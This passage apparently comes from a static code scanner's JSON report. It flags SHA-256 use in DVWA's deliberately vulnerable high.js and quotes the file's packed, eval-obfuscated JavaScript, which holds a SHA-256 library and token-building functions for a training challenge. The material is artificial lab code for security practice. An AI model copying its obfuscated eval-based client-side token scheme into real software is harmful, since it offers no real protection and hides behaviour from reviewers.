t;0}k.2j=1O}z{1a=((a&gt;&gt;&gt;2)|(a&lt;&lt;30))^((a&gt;&gt;&gt;13)|(a&lt;&lt;19))^((a&gt;&gt;&gt;22)|(a&lt;&lt;10));1b=((e&gt;&gt;&gt;6)|(e&lt;&lt;26))^((e&gt;&gt;&gt;11)|(e&lt;&lt;21))^((e&gt;&gt;&gt;25)|(e&lt;&lt;7));1B=a&amp;b;1j=1B^(a&amp;c)^1D;1h=(e&amp;f)^(~e&amp;g);v=h+1b+1h+K[j]+l[j];1f=1a+1j;h=d+v&lt;&lt;0;d=v+1f&lt;&lt;0}1a=((d&gt;&gt;&gt;2)|(d&lt;&lt;30))^((d&gt;&gt;&gt;13)|(d&lt;&lt;19))^((d&gt;&gt;&gt;22)|(d&lt;&lt;10));1b=((h&gt;&gt;&gt;6)|(h&lt;&lt;26))^((h&gt;&gt;&gt;11)|(h&lt;&lt;21))^((h&gt;&gt;&gt;25)|(h&lt;&lt;7));1Z=d&amp;a;1j=1Z^(d&amp;b)^1B;1h=(h&amp;e)^(~h&amp;f);v=g+1b+1h+K[j+1]+l[j+1];1f=1a+1j;g=c+v&lt;&lt;0;c=v+1f&lt;&lt;0;1a=((c&gt;&gt;&gt;2)|(c&lt;&lt;30))^((c&gt;&gt;&gt;13)|(c&lt;&lt;19))^((c&gt;&gt;&gt;22)|(c&lt;&lt;10));1b=((g&gt;&gt;&gt;6)|(g&lt;&lt;26))^((g&gt;&gt;&gt;11)|(g&lt;&lt;21))^((g&gt;&gt;&gt;25)|(g&lt;&lt;7));1V=c&amp;d;1j=1V^(c&amp;a)^1Z;1h=(g&amp;h)^(~g&amp;e);v=f+1b+1h+K[j+2]+l[j+2];1f=1a+1j;f=b+v&lt;&lt;0;b=v+1f&lt;&lt;0;1a=((b&gt;&gt;&gt;2)|(b&lt;&lt;30))^((b&gt;&gt;&gt;13)|(b&lt;&lt;19))^((b&gt;&gt;&gt;22)|(b&lt;&lt;10));1b=((f&gt;&gt;&gt;6)|(f&lt;&lt;26))^((f&gt;&gt;&gt;11)|(f&lt;&lt;21))^((f&gt;&gt;&gt;25)|(f&lt;&lt;7));1D=b&amp;c;1j=1D^(b&amp;d)^1V;1h=(f&amp;g)^(~f&amp;h);v=e+1b+1h+K[j+3]+l[j+3];1f=1a+1j;e=a+v&lt;&lt;0;a=v+1f&lt;&lt;0}k.C=k.C+a&lt;&lt;0;k.B=k.B+b&lt;&lt;0;k.E=k.E+c&lt;&lt;0;k.F=k.F+d&lt;&lt;0;k.J=k.J+e&lt;&lt;0;k.I=k.I+f&lt;&lt;0;k.H=k.H+g&lt;&lt;0;k.D=k.D+h&lt;&lt;0};N.Q.1e=w(){k.1s();q\\x20C=k.C,B=k.B,E=k.E,F=k.F,J=k.J,I=k.I,H=k.H,D=k.D;q\\x201e=m[(C&gt;&gt;28)&amp;o]+m[(C&gt;&gt;24)&amp;o]+m[(C&gt;&gt;20)&amp;o]+m[(C&gt;&gt;16)&amp;o]+m[(C&gt;&gt;12)&amp;o]+m[(C&gt;&gt;8)&amp;o]+m[(C&gt;&gt;4)&amp;o]+m[C&amp;o]+m[(B&gt;&gt;28)&amp;o]+m[(B&gt;&gt;24)&amp;o]+m[(B&gt;&gt;20)&amp;o]+m[(B&gt;&gt;16)&amp;o]+m[(B&gt;&gt;12)&amp;o]+m[(B&gt;&gt;8)&amp;o]+m[(B&gt;&gt;4)&amp;o]+m[B&amp;o]+m[(E&gt;&gt;28)&amp;o]+m[(E&gt;&gt;24)&amp;o]+m[(E&gt;&gt;20)&amp;o]+m[(E&gt;&gt;16)&amp;o]+m[(E&gt;&gt;12)&amp;o]+m[(E&gt;&gt;8)&amp;o]+m[(E&gt;&gt;4)&amp;o]+m[E&amp;o]+m[(F&gt;&gt;28)&amp;o]+m[(F&gt;&gt;24)&amp;o]+m[(F&gt;&gt;20)&amp;o]+m[(F&gt;&gt;16)&amp;o]+m[(F&gt;&gt;12)&amp;o]+m[(F&gt;&gt;8)&amp;o]+m[(F&gt;&gt;4)&amp;o]+m[F&amp;o]+m[(J&gt;&gt;28)&amp;o]+m[(J&gt;&gt;24)&amp;o]+m[(J&gt;&gt;20)&amp;o]+m[(J&gt;&gt;16)&amp;o]+m[(J&gt;&gt;12)&amp;o]+m[(J&gt;&gt;8)&amp;o]+m[(J&gt;&gt;4)&amp;o]+m[J&amp;o]+m[(I&gt;&gt;28)&amp;o]+m[(I&gt;&gt;24)&amp;o]+m[(I&gt;&gt;20)&amp;o]+m[(I&gt;&gt;16)&amp;o]+m[(I&gt;&gt;12)&amp;o]+m[(I&gt;&gt;8)&amp;o]+m[(I&gt;&gt;4)&amp;o]+m[I&amp;o]+m[(H&gt;&gt;28)&amp;o]+m[(H&gt;&gt;24)&amp;o]+m[(H&gt;&gt;20)&amp;o]+m[(H&gt;&gt;16)&amp;o]+m[(H&gt;&gt;12)&amp;o]+m[(H&gt;&gt;8)&amp;o]+m[(H&gt;&gt;4)&amp;o]+m[H&amp;o];p(!k.x){1e+=m[(D&gt;&gt;28)&amp;o]+m[(D&gt;&gt;24)&amp;o]+m[(D&gt;&gt;20)&amp;o]+m[(D&gt;&gt;16)&amp;o]+m[(D&gt;&gt;12)&amp;o]+m[(D&gt;&gt;8)&amp;o]+m[(D&gt;&gt;4)&amp;o]+m[D&amp;o]}A\\x201e};N.Q.2U=N.Q.1e;N.Q.1G=w(){k.1s();q\\x20C=k.C,B=k.B,E=k.E,F=k.F,J=k.J,I=k.I,H=k.H,D=k.D;q\\x202b=[(C&gt;&gt;24)&amp;u,(C&gt;&gt;16)&amp;u,(C&gt;&gt;8)&amp;u,C&amp;u,(B&gt;&gt;24)&amp;u,(B&gt;&gt;16)&amp;u,(B&gt;&gt;8)&amp;u,B&amp;u,(E&gt;&gt;24)&amp;u,(E&gt;&gt;16)&amp;u,(E&gt;&gt;8)&amp;u,E&amp;u,(F&gt;&gt;24)&amp;u,(F&gt;&gt;16)&amp;u,(F&gt;&gt;8)&amp;u,F&amp;u,(J&gt;&gt;24)&amp;u,(J&gt;&gt;16)&amp;u,(J&gt;&gt;8)&amp;u,J&amp;u,(I&gt;&gt;24)&amp;u,(I&gt;&gt;16)&amp;u,(I&gt;&gt;8)&amp;u,I&amp;u,(H&gt;&gt;24)&amp;u,(H&gt;&gt;16)&amp;u,(H&gt;&gt;8)&amp;u,H&amp;u];p(!k.x){2b.4A((D&gt;&gt;24)&amp;u,(D&gt;&gt;16)&amp;u,(D&gt;&gt;8)&amp;u,D&amp;u)}A\\x202b};N.Q.27=N.Q.1G;N.Q.2R=w(){k.1s();q\\x201w=O\\x20Z(k.x?28:32);q\\x201i=O\\x204x(1w);1i.1p(0,k.C);1i.1p(4,k.B);1i.1p(8,k.E);1i.1p(12,k.F);1i.1p(16,k.J);1i.1p(20,k.I);1i.1p(24,k.H);p(!k.x){1i.1p(28,k.D)}A\\x201w};w\\x201P(G,x,1v){q\\x20i,T=1c\\x20G;p(T===\\x272p\\x27){q\\x20L=[],W=G.W,M=0,r;1g(i=0;i&lt;W;++i){r=G.1Q(i);p(r&lt;R){L[M++]=r}z\\x20p(r&lt;2v){L[M++]=(2t|(r&gt;&gt;6));L[M++]=(R|(r&amp;V))}z\\x20p(r&lt;2A||r&gt;=2E){L[M++]=(2D|(r&gt;&gt;12));L[M++]=(R|((r&gt;&gt;6)&amp;V));L[M++]=(R|(r&amp;V))}z{r=2C+(((r&amp;23)&lt;&lt;10)|(G.1Q(++i)&amp;23));L[M++]=(2X|(r&gt;&gt;18));L[M++]=(R|((r&gt;&gt;12)&amp;V));L[M++]=(R|((r&gt;&gt;6)&amp;V));L[M++]=(R|(r&amp;V))}}G=L}z{p(T===\\x271n\\x27){p(G===2q){1u\\x20O\\x201t(1l)}z\\x20p(1y&amp;&amp;G.1J===Z){G=O\\x202r(G)}z\\x20p(!1z.1K(G)){p(!1y||!Z.1N(G)){1u\\x20O\\x201t(1l)}}}z{1u\\x20O\\x201t(1l)}}p(G.W&gt;1k){G=(O\\x20N(x,1d)).S(G).27()}q\\x201F=[],2e=[];1g(i=0;i&lt;1k;++i){q\\x20b=G[i]||0;1F[i]=4z^b;2e[i]=4y^b}N.1I(k,x,1v);k.S(2e);k.1F=1F;k.2c=1d;k.1v=1v}1P.Q=O\\x20N();1P.Q.1s=w(){N.Q.1s.1I(k);p(k.2c){k.2c=1O;q\\x202W=k.27();N.1I(k,k.x,k.1v);k.S(k.1F);k.S(2W);N.Q.1s.1I(k)}};q\\x20X=2a();X.1q=X;X.1H=2a(1d);X.1q.2V=2f();X.1H.2V=2f(1d);p(2G){2g.X=X}z{Y.1q=X.1q;Y.1H=X.1H;p(2s){2l(w(){A\\x20X})}}})();w\\x202y(e){1g(q\\x20t=\\x22\\x22,n=e.W-1;n&gt;=0;n--)t+=e[n];A\\x20t}w\\x202J(t,y=\\x224B\\x22){1m.1o(\\x221M\\x22).1r=1q(1m.1o(\\x221M\\x22).1r+y)}w\\x202B(e=\\x224E\\x22){1m.1o(\\x221M\\x22).1r=1q(e+1m.1o(\\x221M\\x22).1r)}w\\x202K(a,b){1m.1o(\\x221M\\x22).1r=2y(1m.1o(\\x222F\\x22).1r)}1m.1o(\\x222F\\x22).1r=\\x22\\x22;4u(w(){2B(\\x224M\\x22)},4N);1m.1o(\\x224P\\x22).4Q(\\x224R\\x22,2J);2K(\\x223O\\x22,44);&#39;,&#39;||||||||||||||||||||this|blocks|HEX_CHARS||0x0F|if|var|code|message||0xFF|t1|function|is224||else|return|h1|h0|h7|h2|h3|key|h6|h5|h4||bytes|index|Sha256|new|method|prototype|0x80|update|type|SHIFT|0x3f|length|exports|root|ArrayBuffer|||||||||||s0|s1|typeof|true|hex|t2|for|ch|dataView|maj|64|ERROR|document|object|getElementById|setUint32|sha256|value|finalize|Error|throw|sharedMemory|buffer|obj|ARRAY_BUFFER|Array|start|ab|block|bc|OUTPUT_TYPES|oKeyPad|digest|sha224|call|constructor|isArray|hashed|token|isView|false|HmacSha256|charCodeAt|WINDOW|crypto|create|finalized|cd|hash|outputType|Buffer|da||||0x3ff||||array|||createMethod|arr|inner|process|iKeyPad|createHmacMethod|module|notString|hBytes|first|createHmacOutputMethod|define|createOutputMethod|algorithm|NODE_JS|string|null|Uint8Array|AMD|0xc0|lastByteIndex|0x800|EXTRA|createHash|do_something|nodeMethod|0xd800|token_part_2|0x10000|0xe0|0xe000|phrase|COMMON_JS|4294967296|window|token_part_3|token_part_1|WEB_WORKER|self|require|eval|nodeWrap|versions|arrayBuffer|JS_SHA256_NO_NODE_JS|undefined|toString|hmac|innerHash|0xf0|0xa2bfe8a1|0xc24b8b70||0xa81a664b||0x92722c85|0x81c2c92e|0xc76c51a3|0x53380d13|0x766a0abb|0x4d2c6dfc|0x650a7354|0x748f82ee|0x84c87814|0x78a5636f|0x682e6ff3|0x8cc70208|0x2e1b2138|0xa4506ceb|0x90befffa|0xbef9a3f7|0x5b9cca4f|0x4ed8aa4a|0x106aa070|0xf40e3585|0xd6990624|0x19a4c116|0x1e376c08|0x391c0cb3|0x34b0bcb5|0x2748774c|0xd192e819|0x0fc19dc6|32768|128|8388608|2147483648|split|0x428a2f98|0x71374491|0x59f111f1|0x3956c25b|0xe9b5dba5|0xb5c0fbcf|0123456789abcdef|JS_SHA256_NO_ARRAY_BUFFER|is|invalid|input|strict|use|JS_SHA256_NO_WINDOW|ABCD|amd|JS_SHA256_NO_COMMON_JS|global|node|0x923f82a4|0xab1c5ed5|0x983e5152|0xa831c66d|0x76f988da|0x5cb0a9dc|0x4a7484aa|0xb00327c8|0xbf597fc7|0x14292967|0x06ca6351||0xd5a79147|0xc6e00bf3|0x2de92c6f|0x240ca1cc|0x550c7dc3|0x72be5d74|0x243185be|0x12835b01|0xd807aa98|0x80deb1fe|0x9bdc06a7|0xc67178f2|0xefbe4786|0xe49b69c1|0xc19bf174|0x27b70a85|0x3070dd17|300032|1413257819|150054599|24177077|56|4294967295|0x5be0cd19|while|setTimeout|704751109|210244248|DataView|0x36|0x5c|push|ZZ|Object|143694565|YY|0x1f83d9ab|1521486534|0x367cd507|0xc1059ed8|0xffc00b31|0x68581511|0x64f98fa7|XX|300|0x9b05688c|send|addEventListener|click|utf8|0xbefa4fa4|0xf70e5939|0x510e527f|0xbb67ae85|0x6a09e667|0x3c6ef372|0xa54ff53a|JS_SHA256_NO_ARRAY_BUFFER_IS_VIEW&#39;,&#39;split&#39;];(function(c,d){var e=function(f){while(--f){c[&#39;push&#39;](c[&#39;shift&#39;]());}};e(++d);}(a,0x1f4));var b=function(c,d){c=c-0x0;var e=a[c];return e;};eval(function(d,e,f,g,h,i){h=function(j){return(j&lt;e?&#39;&#39;:h(parseInt(j/e)))+((j=j%e)&gt;0x23?String[b(&#39;0x0&#39;)](j+0x1d):j[b(&#39;0x1&#39;)](0x24));};if(!&#39;&#39;[b(&#39;0x2&#39;)](/^/,String)){while(f--){i[h(f)]=g[f]||h(f);}g=[function(k){if(&#39;wpA&#39;!==b(&#39;0x3&#39;)){return i[k];}else{while(f--){i[k(f)]=g[f]||k(f);}g=[function(l){return i[l];}];k=function(){return b(&#39;0x4&#39;);};f=0x1;}}];h=function(){return b(&#39;0x4&#39;);};f=0x1;};while(f--){if(g[f]){if(b(&#39;0x5&#39;)===b(&#39;0x6&#39;)){return i[h];}else{d=d[b(&#39;0x2&#39;)](new RegExp(&#39;\\x5cb&#39;+h(f)+&#39;\\x5cb&#39;,&#39;g&#39;),g[f]);}}}return d;}(b(&#39;0x7&#39;),0x3e,0x137,b(&#39;0x8&#39;)[b(&#39;0x9&#39;)](&#39;|&#39;),0x0,{}));\n\n",
        "startLocationLine": 1,
        "startLocationColumn": 8883,
        "endLocationLine": 1,
        "endLocationColumn": 8887
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high.js",
        "ruleId": "AI008700",
        "ruleName": "Cryptography: Hash Algorithm (SHA-256)",
        "ruleDescription": "Cryptography: Hash Algorithm Usage (SHA-256)",
        "pattern": "SHA-*(2|224|256|384|512)",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.SHA2"
        ],
        "sample": "SHA2",
        "excerpt": "var a=[&#39;fromCharCode&#39;,&#39;toString&#39;,&#39;replace&#39;,&#39;BeJ&#39;,&#39;\\x5cw+&#39;,&#39;Lyg&#39;,&#39;SuR&#39;,&#39;(w(){\\x273M\\x203L\\x27;q\\x201l=\\x273K\\x203I\\x203J\\x20T\\x27;q\\x201R=1c\\x202I===\\x271n\\x27;q\\x20Y=1R?2I:{};p(Y.3N){1R=1O}q\\x202L=!1R&amp;&amp;1c\\x202M===\\x271n\\x27;q\\x202o=!Y.2S&amp;&amp;1c\\x202d===\\x271n\\x27&amp;&amp;2d.2Q&amp;&amp;2d.2Q.3S;p(2o){Y=3R}z\\x20p(2L){Y=2M}q\\x202G=!Y.3Q&amp;&amp;1c\\x202g===\\x271n\\x27&amp;&amp;2g.X;q\\x202s=1c\\x202l===\\x27w\\x27&amp;&amp;2l.3P;q\\x201y=!Y.3H&amp;&amp;1c\\x20Z!==\\x272T\\x27;q\\x20m=\\x273G\\x27.3z(\\x27\\x27);q\\x202w=[-3y,3x,3v,3w];q\\x20U=[24,16,8,0];q\\x20K=[3A,3B,3F,3E,3D,3C,3T,3U,4d,4c,4b,49,4a,4e,4f,4j,4i,4h,3u,48,47,3Z,3Y,3X,3V,3W,40,41,46,45,43,42,4k,3f,38,36,39,37,34,33,2Y,31,2Z,35,3t,3n,3m,3l,3o,3p,3s,3r,3q,3k,3j,3d,3a,3c,3b,3e,3h,3g,3i,4g];q\\x201E=[\\x271e\\x27,\\x2727\\x27,\\x271G\\x27,\\x272R\\x27];q\\x20l=[];p(Y.2S||!1z.1K){1z.1K=w(1x){A\\x204C.Q.2U.1I(1x)===\\x27[1n\\x201z]\\x27}}p(1y&amp;&amp;(Y.50||!Z.1N)){Z.1N=w(1x){A\\x201c\\x201x===\\x271n\\x27&amp;&amp;1x.1w&amp;&amp;1x.1w.1J===Z}}q\\x202m=w(1X,x){A\\x20w(s){A\\x20O\\x20N(x,1d).S(s)[1X]()}};q\\x202a=w(x){q\\x20P=2m(\\x271e\\x27,x);p(2o){P=2P(P,x)}P.1T=w(){A\\x20O\\x20N(x)};P.S=w(s){A\\x20P.1T().S(s)};1g(q\\x20i=0;i&lt;1E.W;++i){q\\x20T=1E[i];P[T]=2m(T,x)}A\\x20P};q\\x202P=w(P,x){q\\x201S=2O(\\x222N(\\x271S\\x27)\\x22);q\\x201Y=2O(\\x222N(\\x271w\\x27).1Y\\x22);q\\x202n=x?\\x271H\\x27:\\x271q\\x27;q\\x202z=w(s){p(1c\\x20s===\\x272p\\x27){A\\x201S.2x(2n).S(s,\\x274S\\x27).1G(\\x271e\\x27)}z{p(s===2q||s===2T){1u\\x20O\\x201t(1l)}z\\x20p(s.1J===Z){s=O\\x202r(s)}}p(1z.1K(s)||Z.1N(s)||s.1J===1Y){A\\x201S.2x(2n).S(O\\x201Y(s)).1G(\\x271e\\x27)}z{A\\x20P(s)}};A\\x202z};q\\x202k=w(1X,x){A\\x20w(G,s){A\\x20O\\x201P(G,x,1d).S(s)[1X]()}};q\\x202f=w(x){q\\x20P=2k(\\x271e\\x27,x);P.1T=w(G){A\\x20O\\x201P(G,x)};P.S=w(G,s){A\\x20P.1T(G).S(s)};1g(q\\x20i=0;i&lt;1E.W;++i){q\\x20T=1E[i];P[T]=2k(T,x)}A\\x20P};w\\x20N(x,1v){p(1v){l[0]=l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0;k.l=l}z{k.l=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]}p(x){k.C=4I;k.B=4H;k.E=4l;k.F=4U;k.J=4J;k.I=4K;k.H=4L;k.D=4T}z{k.C=4X;k.B=4W;k.E=4Y;k.F=4Z;k.J=4V;k.I=4O;k.H=4F;k.D=4s}k.1C=k.1A=k.L=k.2i=0;k.1U=k.1L=1O;k.2j=1d;k.x=x}N.Q.S=w(s){p(k.1U){A}q\\x202h,T=1c\\x20s;p(T!==\\x272p\\x27){p(T===\\x271n\\x27){p(s===2q){1u\\x20O\\x201t(1l)}z\\x20p(1y&amp;&amp;s.1J===Z){s=O\\x202r(s)}z\\x20p(!1z.1K(s)){p(!1y||!Z.1N(s)){1u\\x20O\\x201t(1l)}}}z{1u\\x20O\\x201t(1l)}2h=1d}q\\x20r,M=0,i,W=s.W,l=k.l;4t(M&lt;W){p(k.1L){k.1L=1O;l[0]=k.1C;l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0}p(2h){1g(i=k.1A;M&lt;W&amp;&amp;i&lt;1k;++M){l[i&gt;&gt;2]|=s[M]&lt;&lt;U[i++&amp;3]}}z{1g(i=k.1A;M&lt;W&amp;&amp;i&lt;1k;++M){r=s.1Q(M);p(r&lt;R){l[i&gt;&gt;2]|=r&lt;&lt;U[i++&amp;3]}z\\x20p(r&lt;2v){l[i&gt;&gt;2]|=(2t|(r&gt;&gt;6))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|(r&amp;V))&lt;&lt;U[i++&amp;3]}z\\x20p(r&lt;2A||r&gt;=2E){l[i&gt;&gt;2]|=(2D|(r&gt;&gt;12))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|((r&gt;&gt;6)&amp;V))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|(r&amp;V))&lt;&lt;U[i++&amp;3]}z{r=2C+(((r&amp;23)&lt;&lt;10)|(s.1Q(++M)&amp;23));l[i&gt;&gt;2]|=(2X|(r&gt;&gt;18))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|((r&gt;&gt;12)&amp;V))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|((r&gt;&gt;6)&amp;V))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|(r&amp;V))&lt;&lt;U[i++&amp;3]}}}k.2u=i;k.L+=i-k.1A;p(i&gt;=1k){k.1C=l[16];k.1A=i-1k;k.1W();k.1L=1d}z{k.1A=i}}p(k.L&gt;4r){k.2i+=k.L/2H&lt;&lt;0;k.L=k.L%2H}A\\x20k};N.Q.1s=w(){p(k.1U){A}k.1U=1d;q\\x20l=k.l,i=k.2u;l[16]=k.1C;l[i&gt;&gt;2]|=2w[i&amp;3];k.1C=l[16];p(i&gt;=4q){p(!k.1L){k.1W()}l[0]=k.1C;l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0}l[14]=k.2i&lt;&lt;3|k.L&gt;&gt;&gt;29;l[15]=k.L&lt;&lt;3;k.1W()};N.Q.1W=w(){q\\x20a=k.C,b=k.B,c=k.E,d=k.F,e=k.J,f=k.I,g=k.H,h=k.D,l=k.l,j,1a,1b,1j,v,1f,1h,1B,1Z,1V,1D;1g(j=16;j&lt;1k;++j){v=l[j-15];1a=((v&gt;&gt;&gt;7)|(v&lt;&lt;25))^((v&gt;&gt;&gt;18)|(v&lt;&lt;14))^(v&gt;&gt;&gt;3);v=l[j-2];1b=((v&gt;&gt;&gt;17)|(v&lt;&lt;15))^((v&gt;&gt;&gt;19)|(v&lt;&lt;13))^(v&gt;&gt;&gt;10);l[j]=l[j-16]+1a+l[j-7]+1b&lt;&lt;0}1D=b&amp;c;1g(j=0;j&lt;1k;j+=4){p(k.2j){p(k.x){1B=4m;v=l[0]-4n;h=v-4o&lt;&lt;0;d=v+4p&lt;&lt;0}z{1B=4v;v=l[0]-4w;h=v-4G&lt;&lt;0;d=v+4D&lt;&lt;0}k.2j=1O}z{1a=((a&gt;&gt;&gt;2)|(a&lt;&lt;30))^((a&gt;&gt;&gt;13)|(a&lt;&lt;19))^((a&gt;&gt;&gt;22)|(a&lt;&lt;10));1b=((e&gt;&gt;&gt;6)|(e&lt;&lt;26))^((e&gt;&gt;&gt;11)|(e&lt;&lt;21))^((e&gt;&gt;&gt;25)|(e&lt;&lt;7));1B=a&amp;b;1j=1B^(a&amp;c)^1D;1h=(e&amp;f)^(~e&amp;g);v=h+1b+1h+K[j]+l[j];1f=1a+1j;h=d+v&lt;&lt;0;d=v+1f&lt;&lt;0}1a=((d&gt;&gt;&gt;2)|(d&lt;&lt;30))^((d&gt;&gt;&gt;13)|(d&lt;&lt;19))^((d&gt;&gt;&gt;22)|(d&lt;&lt;10));1b=((h&gt;&gt;&gt;6)|(h&lt;&lt;26))^((h&gt;&gt;&gt;11)|(h&lt;&lt;21))^((h&gt;&gt;&gt;25)|(h&lt;&lt;7));1Z=d&amp;a;1j=1Z^(d&amp;b)^1B;1h=(h&amp;e)^(~h&amp;f);v=g+1b+1h+K[j+1]+l[j+1];1f=1a+1j;g=c+v&lt;&lt;0;c=v+1f&lt;&lt;0;1a=((c&gt;&gt;&gt;2)|(c&lt;&lt;30))^((c&gt;&gt;&gt;13)|(c&lt;&lt;19))^((c&gt;&gt;&gt;22)|(c&lt;&lt;10));1b=((g&gt;&gt;&gt;6)|(g&lt;&lt;26))^((g&gt;&gt;&gt;11)|(g&lt;&lt;21))^((g&gt;&gt;&gt;25)|(g&lt;&lt;7));1V=c&amp;d;1j=1V^(c&amp;a)^1Z;1h=(g&amp;h)^(~g&amp;e);v=f+1b+1h+K[j+2]+l[j+2];1f=1a+1j;f=b+v&lt;&lt;0;b=v+1f&lt;&lt;0;1a=((b&gt;&gt;&gt;2)|(b&lt;&lt;30))^((b&gt;&gt;&gt;13)|(b&lt;&lt;19))^((b&gt;&gt;&gt;22)|(b&lt;&lt;10));1b=((f&gt;&gt;&gt;6)|(f&lt;&lt;26))^((f&gt;&gt;&gt;11)|(f&lt;&lt;21))^((f&gt;&gt;&gt;25)|(f&lt;&lt;7));1D=b&amp;c;1j=1D^(b&amp;d)^1V;1h=(f&amp;g)^(~f&amp;h);v=e+1b+1h+K[j+3]+l[j+3];1f=1a+1j;e=a+v&lt;&lt;0;a=v+1f&lt;&lt;0}k.C=k.C+a&lt;&lt;0;k.B=k.B+b&lt;&lt;0;k.E=k.E+c&lt;&lt;0;k.F=k.F+d&lt;&lt;0;k.J=k.J+e&lt;&lt;0;k.I=k.I+f&lt;&lt;0;k.H=k.H+g&lt;&lt;0;k.D=k.D+h&lt;&lt;0};N.Q.1e=w(){k.1s();q\\x20C=k.C,B=k.B,E=k.E,F=k.F,J=k.J,I=k.I,H=k.H,D=k.D;q\\x201e=m[(C&gt;&gt;28)&amp;o]+m[(C&gt;&gt;24)&amp;o]+m[(C&gt;&gt;20)&amp;o]+m[(C&gt;&gt;16)&amp;o]+m[(C&gt;&gt;12)&amp;o]+m[(C&gt;&gt;8)&amp;o]+m[(C&gt;&gt;4)&amp;o]+m[C&amp;o]+m[(B&gt;&gt;28)&amp;o]+m[(B&gt;&gt;24)&amp;o]+m[(B&gt;&gt;20)&amp;o]+m[(B&gt;&gt;16)&amp;o]+m[(B&gt;&gt;12)&amp;o]+m[(B&gt;&gt;8)&amp;o]+m[(B&gt;&gt;4)&amp;o]+m[B&amp;o]+m[(E&gt;&gt;28)&amp;o]+m[(E&gt;&gt;24)&amp;o]+m[(E&gt;&gt;20)&amp;o]+m[(E&gt;&gt;16)&amp;o]+m[(E&gt;&gt;12)&amp;o]+m[(E&gt;&gt;8)&amp;o]+m[(E&gt;&gt;4)&amp;o]+m[E&amp;o]+m[(F&gt;&gt;28)&amp;o]+m[(F&gt;&gt;24)&amp;o]+m[(F&gt;&gt;20)&amp;o]+m[(F&gt;&gt;16)&amp;o]+m[(F&gt;&gt;12)&amp;o]+m[(F&gt;&gt;8)&amp;o]+m[(F&gt;&gt;4)&amp;o]+m[F&amp;o]+m[(J&gt;&gt;28)&amp;o]+m[(J&gt;&gt;24)&amp;o]+m[(J&gt;&gt;20)&amp;o]+m[(J&gt;&gt;16)&amp;o]+m[(J&gt;&gt;12)&amp;o]+m[(J&gt;&gt;8)&amp;o]+m[(J&gt;&gt;4)&amp;o]+m[J&amp;o]+m[(I&gt;&gt;28)&amp;o]+m[(I&gt;&gt;24)&amp;o]+m[(I&gt;&gt;20)&amp;o]+m[(I&gt;&gt;16)&amp;o]+m[(I&gt;&gt;12)&amp;o]+m[(I&gt;&gt;8)&amp;o]+m[(I&gt;&gt;4)&amp;o]+m[I&amp;o]+m[(H&gt;&gt;28)&amp;o]+m[(H&gt;&gt;24)&amp;o]+m[(H&gt;&gt;20)&amp;o]+m[(H&gt;&gt;16)&amp;o]+m[(H&gt;&gt;12)&amp;o]+m[(H&gt;&gt;8)&amp;o]+m[(H&gt;&gt;4)&amp;o]+m[H&amp;o];p(!k.x){1e+=m[(D&gt;&gt;28)&amp;o]+m[(D&gt;&gt;24)&amp;o]+m[(D&gt;&gt;20)&amp;o]+m[(D&gt;&gt;16)&amp;o]+m[(D&gt;&gt;12)&amp;o]+m[(D&gt;&gt;8)&amp;o]+m[(D&gt;&gt;4)&amp;o]+m[D&amp;o]}A\\x201e};N.Q.2U=N.Q.1e;N.Q.1G=w(){k.1s();q\\x20C=k.C,B=k.B,E=k.E,F=k.F,J=k.J,I=k.I,H=k.H,D=k.D;q\\x202b=[(C&gt;&gt;24)&amp;u,(C&gt;&gt;16)&amp;u,(C&gt;&gt;8)&amp;u,C&amp;u,(B&gt;&gt;24)&amp;u,(B&gt;&gt;16)&amp;u,(B&gt;&gt;8)&amp;u,B&amp;u,(E&gt;&gt;24)&amp;u,(E&gt;&gt;16)&amp;u,(E&gt;&gt;8)&amp;u,E&amp;u,(F&gt;&gt;24)&amp;u,(F&gt;&gt;16)&amp;u,(F&gt;&gt;8)&amp;u,F&amp;u,(J&gt;&gt;24)&amp;u,(J&gt;&gt;16)&amp;u,(J&gt;&gt;8)&amp;u,J&amp;u,(I&gt;&gt;24)&amp;u,(I&gt;&gt;16)&amp;u,(I&gt;&gt;8)&amp;u,I&amp;u,(H&gt;&gt;24)&amp;u,(H&gt;&gt;16)&amp;u,(H&gt;&gt;8)&amp;u,H&amp;u];p(!k.x){2b.4A((D&gt;&gt;24)&amp;u,(D&gt;&gt;16)&amp;u,(D&gt;&gt;8)&amp;u,D&amp;u)}A\\x202b};N.Q.27=N.Q.1G;N.Q.2R=w(){k.1s();q\\x201w=O\\x20Z(k.x?28:32);q\\x201i=O\\x204x(1w);1i.1p(0,k.C);1i.1p(4,k.B);1i.1p(8,k.E);1i.1p(12,k.F);1i.1p(16,k.J);1i.1p(20,k.I);1i.1p(24,k.H);p(!k.x){1i.1p(28,k.D)}A\\x201w};w\\x201P(G,x,1v){q\\x20i,T=1c\\x20G;p(T===\\x272p\\x27){q\\x20L=[],W=G.W,M=0,r;1g(i=0;i&lt;W;++i){r=G.1Q(i);p(r&lt;R){L[M++]=r}z\\x20p(r&lt;2v){L[M++]=(2t|(r&gt;&gt;6));L[M++]=(R|(r&amp;V))}z\\x20p(r&lt;2A||r&gt;=2E){L[M++]=(2D|(r&gt;&gt;12));L[M++]=(R|((r&gt;&gt;6)&amp;V));L[M++]=(R|(r&amp;V))}z{r=2C+(((r&amp;23)&lt;&lt;10)|(G.1Q(++i)&amp;23));L[M++]=(2X|(r&gt;&gt;18));L[M++]=(R|((r&gt;&gt;12)&amp;V));L[M++]=(R|((r&gt;&gt;6)&amp;V));L[M++]=(R|(r&amp;V))}}G=L}z{p(T===\\x271n\\